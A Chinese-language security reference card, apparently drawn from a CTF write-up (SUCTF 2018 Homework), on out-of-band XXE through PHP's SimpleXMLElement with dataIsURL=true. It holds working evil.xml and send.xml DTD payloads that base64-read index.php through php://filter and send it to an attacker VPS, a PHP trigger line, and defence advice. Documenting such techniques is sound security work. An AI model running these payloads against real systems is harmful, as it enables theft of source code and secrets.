---
id: web-php-native-class-simplexml-xxe-datalisurl
title: PHP 原生类 SimpleXMLElement XXE：dataIsURL=true 时构造参数被当 URL 加载攻击者 DTD 并 OOB 外带
type: scenario
domain: web
path: web/generic/xxe
technique: php-simplexml-native-class-xxe
aliases:
- SimpleXMLElement XXE
- dataIsURL XXE
- PHP 原生类 XXE
- new SimpleXMLElement($url,2,true)
- SUCTF 2018 Homework
tags:
- php
- xxe
- simplexml
- native-class
- oob
- php-filter
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V534
  verified_at: '2026-11-11T17:21:23+08:00'
  notes: 已对照原文全文与16张截图逐张核对：img10 PHP 手册确认 dataIsURL=true 时 data 为 XML 文档路径/URL，img11/12/13 为 SUCTF Homework 计算器 module=calc&args 参数可控，img14 VPS 日志确认 test/evil.xml、test/send.xml 与带 base64 的回连，与卡片 PoC/原理一致。触发方式与三个构造参数（url, options=2, dataIsURL=true）与原文一致。已修正卡片一处技术细节：options=2 是 LIBXML_NOENT（替换实体），不是 LIBXML_PARSEHUGE。原文未提受影响 PHP 版本，affected_versions 保持为空。
---

## 一句话结论

`SimpleXMLElement::__construct($data, $options, $dataIsURL)` 的第三个参数为 `true` 时，`$data` 会被当成文件路径或 URL 读取并解析为 XML；当应用存在可控的类实例化（如 `new $class($args)`）且能控制前三个构造参数时，把 `$data` 指向攻击者 VPS 上的恶意 XML，即可让目标解析器加载外部 DTD、执行参数实体，并用 `php://filter` 把本地源码 Base64 后通过 HTTP 外带到攻击者服务器。

## 原理

- `SimpleXMLElement` 的构造签名是 `__construct(string $data, int $options = 0, bool $dataIsURL = false, ...)`。官方文档明确：`dataIsURL` 为 `true` 时，`data` 是“指向 XML 文档的路径或 URL”而不是 XML 字符串本身。
- 因此攻击者只要控制构造参数，把 `data` 设为 `http://VPS/evil.xml`、`options` 设为 `2`（即 `LIBXML_NOENT`，替换实体；原文用 2）、`dataIsURL` 设为 `true`，目标就会主动请求该 URL 并解析返回的 XML。
- 恶意 XML 中声明外部参数实体：`<!ENTITY % int SYSTEM "http://VPS/send.xml"> %int; %all; %send;`。`send.xml` 再定义 `%payl` 为 `php://filter/read=convert.base64-encode/resource=index.php`，并用 `%all` 动态构造 `%send` 实体，把 `%payl` 的内容拼进请求 URL 发回 VPS。
- 结果：VPS 的 HTTP 日志里出现 `GET /?<base64源码>`，解码即得目标文件内容。整个过程是典型的 OOB XXE，不依赖回显。
- 成立前提：目标 libxml 允许加载外部实体（未禁用 `LIBXML_NOENT`/外部实体加载，或 `libxml_disable_entity_loader` 未生效），PHP 允许 `allow_url_fopen`/HTTP 流，且攻击者 VPS 可达。
- 该原语与“SimpleXMLElement 读本地文件”同源，但目标不是把本地文件当 XML 解析回显，而是利用 XML 解析器的外部实体解析能力做 SSRF/文件外带。

## 触发条件

- 应用存在可控的类名与构造参数实例化（`new $class(...$args)`、反射 `newInstanceArgs`、`module=calc&args[]=...` 之类），或能反序列化 `SimpleXMLElement` 对象。
- 目标 PHP 启用 SimpleXML 扩展，libxml 未禁用外部实体加载。
- 目标可出网访问攻击者 VPS，或 VPS 与目标网络可达。
- 攻击者能托管 evil.xml 与 send.xml。

## 利用步骤

1. 在 VPS 上放置 `evil.xml`：声明外部参数实体 `%int` 指向 `send.xml`，并在 DTD 中引用 `%int; %all; %send;`。
2. 放置 `send.xml`：定义 `%payl` 为 `php://filter/read=convert.base64-encode/resource=index.php`，定义 `%all` 为构造 `%send` 实体的语句，使 `%send` 指向 `http://VPS/?%payl;`。
3. 触发目标实例化 `new SimpleXMLElement("http://VPS/evil.xml", 2, true)`（或通过可控 `$class/$args` 传入等价参数）。
4. 观察 VPS 访问日志：先收到 `evil.xml`、`send.xml`，随后收到带 Base64 查询串的请求；解码查询串得到源码/flag。
5. 需要读其它文件时，替换 `send.xml` 中的 `resource=` 路径后重放。

## PoC

evil.xml：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE try[
<!ENTITY % int SYSTEM "http://VPS/test/send.xml">
%int;
%all;
%send;
]>
```

send.xml：

```xml
<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://VPS/?%payl;'>">
```

触发（可控类实例化场景）：

```php
new SimpleXMLElement("http://VPS/test/evil.xml", 2, true);
```

VPS 日志中出现 `GET /?PD9waHA...`，Base64 解码即源码。

## 变体与关联

- 变体：只读单个本地文件时，可把 `data` 直接设为 `php://filter/...` 或本地路径，利用报错/解析结果带出；相关用法见 `web-php-reflectionclass-newinstanceargs-imagick-msl-webshell`。
- 关联：XXE + `php://filter` 双 Base64 内网链见 `web-generic-xxe-php-filter-ssrf-internal-lfi-chain`；泛 XXE OOB 外带手法见 `web-generic-xxe-oob-exfil`。
- 变体：`SimpleXMLElement` 可换成 `DOMDocument::load`/`XMLReader` 等可实例化解析类。

## 检测与防御

- 禁用外部实体：PHP 8 起默认不加载外部实体；旧版本用 `libxml_disable_entity_loader(true)`、`LIBXML_NONET`，并避免把 `dataIsURL` 设为 true 处理不可信输入。
- 不要让用户控制类名/构造参数（尤其 `new $class(...$args)`、反射 `newInstanceArgs`）。
- 检测：目标向外部发起 XML/DTD 请求、请求 URL 带 base64 长串；响应/日志出现 `<!ENTITY`、`SYSTEM "http` 等特征。
